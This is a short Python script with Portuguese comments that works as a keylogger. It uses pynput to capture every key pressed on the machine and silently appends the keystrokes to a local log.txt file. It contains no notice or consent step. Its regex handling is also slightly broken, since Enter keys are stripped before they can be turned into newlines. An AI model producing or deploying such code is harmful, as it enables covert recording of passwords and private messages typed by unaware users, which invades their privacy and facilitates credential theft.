from pynput.keyboard import Listener
import re

# Abre o arquivo para gravação no modo append
def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)  # Substitui o espaço por um espaço real
    tecla = re.sub(r'Key.*', '', tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)

    # Verifica se é uma tecla especial
    if tecla.startswith("Key."):
        tecla = tecla.replace("Key.", "")
    else:
        # Remove aspas simples ao redor da tecla
        tecla = re.sub(r'\'', '', tecla)

    # Escreve a tecla no arquivo de log
    with open("log.txt", "a") as arquivo:
        arquivo.write(tecla)  # Grava a tecla sem pular uma linha

# Inicializa o Listener com a função capturar
with Listener(on_press=capturar) as listener:
    listener.join()
